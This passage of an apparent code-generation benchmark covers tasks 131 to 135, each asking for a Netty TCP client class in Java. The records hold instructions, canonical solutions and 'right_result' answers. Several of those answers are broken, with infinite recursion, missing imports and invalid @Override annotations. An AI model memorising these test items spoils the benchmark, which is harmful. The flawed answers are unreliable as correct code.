    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisArrayAggregator;\nimport io.netty.handler.codec.redis.RedisBulkStringAggregator;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class RedisClient {\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"6379\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new RedisDecoder());\n                     p.addLast(new RedisBulkStringAggregator());\n                     p.addLast(new RedisArrayAggregator());\n                     p.addLast(new RedisEncoder());\n                     p.addLast(new RedisClientHandler());\n                 }\n             });\n\n            channel = b.connect(HOST, PORT).sync().channel();\n\n            System.out.println(\"Enter Redis commands (quit to end)\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                final String input = in.readLine();\n                final String line = input != null ? input.trim() : null;\n                if (line == null || \"quit\".equalsIgnoreCase(line)) {\n                    channel.close().sync();\n                    break;\n                } else if (line.isEmpty()) {\n                    continue;\n                }\n                lastWriteFuture = channel.writeAndFlush(line);\n                lastWriteFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n                    @Override\n                    public void operationComplete(ChannelFuture future) throws Exception {\n                        if (!future.isSuccess()) {\n                            System.err.print(\"write failed: \");\n                            future.cause().printStackTrace(System.err);\n                        }\n                    }\n                });\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void stop() throws InterruptedException {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\n\npublic class RedisClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 6379;\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     initChannel(ch);\n                 }\n             });\n\n            // Start the connection attempt.\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            // Wait until the connection is closed.\n            f.channel().closeFuture().sync();\n        } finally {\n            // Shut down all event loops to terminate all threads.\n            group.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (lastWriteFuture != null) {\n            lastWriteFuture.syncUninterruptibly();\n        }\n        channel.close();\n        group.shutdownGracefully();\n    }\n\n    protected void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline p = ch.pipeline();\n        p.addLast(new RedisEncoder());\n        p.addLast(new RedisDecoder());\n        p.addLast(new SimpleChannelInboundHandler<Object>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                System.out.println(\"Received: \" + msg.toString());\n            }\n        });\n    }\n\n    public void sendCommand(String command) {\n        ByteBuf buf = Unpooled.copiedBuffer(command.getBytes());\n        lastWriteFuture = channel.writeAndFlush(buf);\n    }\n}\n```"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to send serialized Java objects to a remote server.\n\nClass Description: The JacksonClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It sends a JacksonBean object containing sample data (including lists and maps) to the server and handles connection lifecycle properly.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server\nport: int - The port number of the remote server\n\nMethods:\nconstructor: JacksonClient(String host, int port) -> void - Initializes the client with target server address\nrun: run() -> void - Establishes connection, sends sample data, and manages connection lifecycle. Throws Exception if connection fails",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class JacksonClient {\n\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new JacksonClientInitializer());\n            \n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            JacksonBean user = new JacksonBean();\n            user.setAge(27);\n            user.setName(\"waylau\");\n            List<String> sons = new ArrayList<String>();\n            for (int i = 0; i < 10; i++) {\n                sons.add(\"Lucy\"+i);\n                sons.add(\"Lily\"+i);\n            }\n\n            user.setSons(sons);\n            Map<String, String> addrs = new HashMap<String, String>();\n            for (int i = 0; i < 10; i++) {\n                addrs.put(\"001\"+i, \"18998366112\");\n                addrs.put(\"002\"+i, \"15014965012\");\n            }\n\n            user.setAddrs(addrs);\n            channel.write(user);\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class JacksonClient {\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new ObjectEncoder());\n                     p.addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                     p.addLast(new JacksonClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            JacksonBean sampleData = new JacksonBean();\n            f.channel().writeAndFlush(sampleData);\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new JacksonClient(\"localhost\", 8080).run();\n    }\n}\n\nclass JacksonBean {\n    private String name = \"John Doe\";\n    private int age = 30;\n    private List<String> hobbies = Arrays.asList(\"Reading\", \"Swimming\");\n    private Map<String, Integer> scores = new HashMap<>();\n\n    public JacksonBean() {\n        scores.put(\"Math\", 95);\n        scores.put(\"Science\", 88);\n    }\n\n    // Getters and setters\n}\n\nclass JacksonClientHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        System.out.println(\"Received response from server: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a proxy server, handle SSL encryption if enabled, manage connection lifecycle, and support reconnection with exponential backoff.\n\nClass Description: ProxyClientContainer is a Netty-based TCP client container that establishes and maintains a connection to a proxy server. It handles SSL encryption when configured, manages connection retries with exponential backoff, and provides channel management for proxy communication.\n\nAttributes:\n- logger: [Logger] - SLF4J logger instance for logging events\n- workerGroup: [NioEventLoopGroup] - Netty event loop group for handling I/O operations\n- bootstrap: [Bootstrap] - Primary bootstrap for proxy server connections\n- realServerBootstrap: [Bootstrap] - Bootstrap for real server connections\n- config: [Config] - Configuration instance for client settings\n- sslContext: [SSLContext] - SSL context for secure connections (nullable)\n- sleepTimeMill: [long] - Current sleep duration for reconnection attempts\n\nMethods:\n- ProxyClientContainer() -> [void] - Constructor that initializes worker group, bootstraps, and configures channel pipelines\n- start() -> [void] - Starts the client by initiating connection to proxy server\n- createSslHandler(SSLContext sslContext) -> [ChannelHandler] - Creates SSL handler for secure connections\n- connectProxyServer() -> [void] - Connects to proxy server with retry logic on failure\n- stop() -> [void] - Shuts down the client gracefully\n- channelInactive(ChannelHandlerContext ctx) -> [void] - Handles channel inactive events by triggering reconnection\n- reconnectWait() -> [void] - Implements exponential backoff for reconnection attempts",
    "Canonical_solution": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.client.handlers.ClientChannelHandler;\nimport org.fengfei.lanproxy.client.handlers.RealServerChannelHandler;\nimport org.fengfei.lanproxy.common.Config;\nimport org.fengfei.lanproxy.protocol.IdleCheckHandler;\nimport org.fengfei.lanproxy.protocol.ProxyMessage;\nimport org.fengfei.lanproxy.protocol.ProxyMessageDecoder;\nimport org.fengfei.lanproxy.protocol.ProxyMessageEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class ProxyClientContainer {\n\n    private static Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n\n    private NioEventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n    private Bootstrap realServerBootstrap;\n    private Config config = Config.getInstance();\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer() {\n        workerGroup = new NioEventLoopGroup();\n        realServerBootstrap = new Bootstrap();\n        realServerBootstrap.group(workerGroup);\n        realServerBootstrap.channel(NioSocketChannel.class);\n        realServerBootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new RealServerChannelHandler());\n            }\n        });\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                if (Config.getInstance().getBooleanValue(\"ssl.enable\", false)) {\n                    if (sslContext == null) {\n                        sslContext = SslContextCreator.createSSLContext();\n                    }\n                    ch.pipeline().addLast(createSslHandler(sslContext));\n                }\n                ch.pipeline().addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                ch.pipeline().addLast(new ProxyMessageEncoder());\n                ch.pipeline().addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, IdleCheckHandler.WRITE_IDLE_TIME - 10, 0));\n                ch.pipeline().addLast(new ClientChannelHandler(realServerBootstrap, bootstrap, ProxyClientContainer.this));\n            }\n        });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(true);\n        return new SslHandler(sslEngine);\n    }\n\n    private void connectProxyServer() {\n        bootstrap.connect(config.getStringValue(\"server.host\"), config.getIntValue(\"server.port\")).addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (future.isSuccess()) {\n                    ProxyMessage proxyMessage = new ProxyMessage();\n                    proxyMessage.setType(ProxyMessage.C_TYPE_AUTH);\n                    proxyMessage.setUri(config.getStringValue(\"client.key\"));\n                    future.channel().writeAndFlush(proxyMessage);\n                    sleepTimeMill = 1000;\n                    logger.info(\"connect proxy server success, {}\", future.channel());\n                } else {\n                    logger.warn(\"connect proxy server failed\", future.cause());\n                    reconnectWait();\n                    connectProxyServer();\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            if (sleepTimeMill > 60000) {\n                sleepTimeMill = 1000;\n            }\n            synchronized (this) {\n                sleepTimeMill = sleepTimeMill * 2;\n                wait(sleepTimeMill);\n            }\n        } catch (InterruptedException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ProxyClientContainer {\n    private static final Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n    private NioEventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n    private Bootstrap realServerBootstrap;\n    private Config config;\n    private SslContext sslContext;\n    private long sleepTimeMill = 1000L;\n\n    public ProxyClientContainer(Config config) {\n        this.config = config;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap().group(workerGroup).channel(NioSocketChannel.class);\n        this.realServerBootstrap = new Bootstrap().group(workerGroup).channel(NioSocketChannel.class);\n        if (config.isEnableSSL()) {\n            try {\n                this.sslContext = SslContextBuilder.forClient().build();\n            } catch (Exception e) {\n                logger.error(\"Failed to initialize SSL context\", e);\n            }\n        }\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SslContext sslContext) {\n        return sslContext.newHandler(System.out);\n    }\n\n    private void connectProxyServer() {\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                if (sslContext != null) {\n                    pipeline.addLast(createSslHandler(sslContext));\n                }\n                pipeline.addLast(new ProxyClientHandler());\n            }\n        });\n        bootstrap.connect(config.getProxyHost(), config.getProxyPort()).addListener((ChannelFutureListener) future -> {\n            if (!future.isSuccess()) {\n                logger.error(\"Connection to proxy server failed, retrying...\");\n                reconnectWait();\n                connectProxyServer();\n            } else {\n                logger.info(\"Connected to proxy server\");\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n        logger.warn(\"Proxy server connection lost, attempting to reconnect...\");\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            Thread.sleep(sleepTimeMill);\n            sleepTimeMill *= 2;\n            if (sleepTimeMill > 60000) {\n                sleepTimeMill = 60000; // Cap at 1 minute\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a non-blocking connection to a remote server, send serialized objects, and handle graceful shutdown.\n\nClass Description: SerializationClient is a Netty-based TCP client that connects to a specified host and port, sends multiple instances of a serializable object (SerializationBean) to the server, and manages connection lifecycle including proper resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: SerializationClient(String host, int port) -> None - Initializes the client with target server's host and port\n- run: void() throws Exception - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Sends multiple serialized objects\n  4. Manages connection lifecycle and cleanup\n  5. Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class SerializationClient {\n\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SerializationClientInitializer());\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            SerializationBean user = new SerializationBean();\n\n            for (int i = 0; i < 10; i++) {\n                user = new SerializationBean();\n                user.setAge(i);\n                user.setName(\"waylau\");\n                channel.write(user);\n            }\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\n\npublic class SerializationClient {\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new ObjectEncoder());\n                     p.addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                     p.addLast(new ClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + SerializationClient.class.getSimpleName() + \" <host> <port>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        new SerializationClient(host, port).run();\n    }\n}\n\nclass ClientHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        // Handle response from server if needed\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle Protocol Buffers (protobuf) message encoding/decoding, and manage connection lifecycle.\n\nClass Description: ProtobufProxy is a Netty-based TCP client implementation that connects to a specified server address and port, configures a pipeline for protobuf message processing, and manages connection resources. It implements a Proxy interface and handles graceful shutdown of network resources.\n\nMethods:\n\nconnect: [connect](String serverAddress, int port) -> void - Establishes a TCP connection to the specified server address and port. Configures the Netty pipeline with protobuf handlers and connection management components. The method blocks until the connection is closed and ensures proper resource cleanup.\n\nInput:\n- serverAddress: String - The IP address or hostname of the server to connect to\n- port: int - The TCP port number of the server\n\nOutput: None (void) - The method establishes a persistent connection that remains active until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.ProtobufTransferHandler;\nimport org.nico.ratel.landlords.client.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.entity.ClientTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(0, 4, 0, TimeUnit.SECONDS))\n                                    .addLast(new ProtobufVarint32FrameDecoder())\n                                    .addLast(new ProtobufDecoder(ClientTransferData.ClientTransferDataProtoc.getDefaultInstance()))\n                                    .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                    .addLast(new ProtobufEncoder())\n                                    .addLast(new SecondProtobufCodec())\n                                    .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport com.google.protobuf.Message;\n\npublic class ProtobufProxy implements Proxy {\n    private EventLoopGroup group;\n    private Channel channel;\n\n    @Override\n    public void connect(String serverAddress, int port) throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your protobuf handlers here\n                     p.addLast(\"decoder\", new ProtobufDecoder(YourProtobufMessage.getDefaultInstance()));\n                     p.addLast(\"encoder\", new ProtobufEncoder());\n                     p.addLast(\"handler\", new ProtobufClientHandler());\n                 }\n             });\n\n            channel = b.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    // Define your ProtobufClientHandler class here\n    private static class ProtobufClientHandler extends SimpleChannelInboundHandler<Message> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Message msg) throws Exception {\n            // Handle incoming protobuf messages\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```\n\nNote: Replace `YourProtobufMessage` with the actual protobuf message type you are working with."
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Java class that implements a Netty TCP client for establishing and managing non-blocking TCP connections to a remote server, handling message sending, and providing reconnection capabilities.\n\nClass Description: The `NettyClient` class is a Spring component that manages a Netty-based TCP client. It handles connection establishment, message sending, automatic reconnection on failure, and graceful shutdown. The client uses Netty's non-blocking I/O model with NioSocketChannel for efficient communication.\n\nAttributes:\n- `RECONNECT_SECONDS`: Integer - The delay in seconds before attempting to reconnect after a connection failure.\n- `logger`: Logger - SLF4J logger for logging client activities and errors.\n- `serverHost`: String - The host address of the remote server to connect to (injected via Spring).\n- `serverPort`: Integer - The port number of the remote server to connect to (injected via Spring).\n- `eventGroup`: EventLoopGroup - Netty event loop group for managing I/O threads.\n- `channel`: Channel - The active channel representing the connection to the server (volatile for thread safety).\n\nMethods:\n- `start()`: void - Initializes and starts the Netty client, attempting to connect to the server. Uses Bootstrap to configure client settings and sets up connection listener.\n- `reconnect()`: void - Schedules a reconnection attempt after a connection failure, using the specified RECONNECT_SECONDS delay.\n- `shutdown()`: void - Gracefully shuts down the client by closing the active channel and releasing event loop resources (annotated with @PreDestroy for Spring lifecycle management).\n- `send(Invocation invocation)`: void - Sends a message to the server through the active channel. Validates channel state before sending.",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyclientdemo.client.handler.NettyClientHandlerInitializer;\nimport cn.iocoder.springboot.lab67.nettycommondemo.codec.Invocation;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final Integer RECONNECT_SECONDS = 20;\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.server.host}\")\n    private String serverHost;\n    @Value(\"${netty.server.port}\")\n    private Integer serverPort;\n\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(serverHost, serverPort)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new NettyClientHandlerInitializer());\n\n        bootstrap.connect().addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (!future.isSuccess()) {\n                    logger.error(\"[start][Netty Client connection to server({}:{}) failed]\", serverHost, serverPort);\n                    reconnect();\n                    return;\n                }\n                channel = future.channel();\n                logger.info(\"[start][Netty Client connected to server({}:{}) successfully]\", serverHost, serverPort);\n            }\n        });\n    }\n\n    public void reconnect() {\n        eventGroup.schedule(new Runnable() {\n            @Override\n            public void run() {\n                logger.info(\"[reconnect][Starting reconnection]\");\n                try {\n                    start();\n                } catch (InterruptedException e) {\n                    logger.error(\"[reconnect][Reconnection failed]\", e);\n                }\n            }\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n        logger.info(\"[reconnect][Will attempt reconnection in {} seconds]\", RECONNECT_SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null) {\n            logger.error(\"[send][Connection does not exist]\");\n            return;\n        }\n        if (!channel.isActive()) {\n            logger.error(\"[send][Connection({}) is not active]\", channel.id());\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
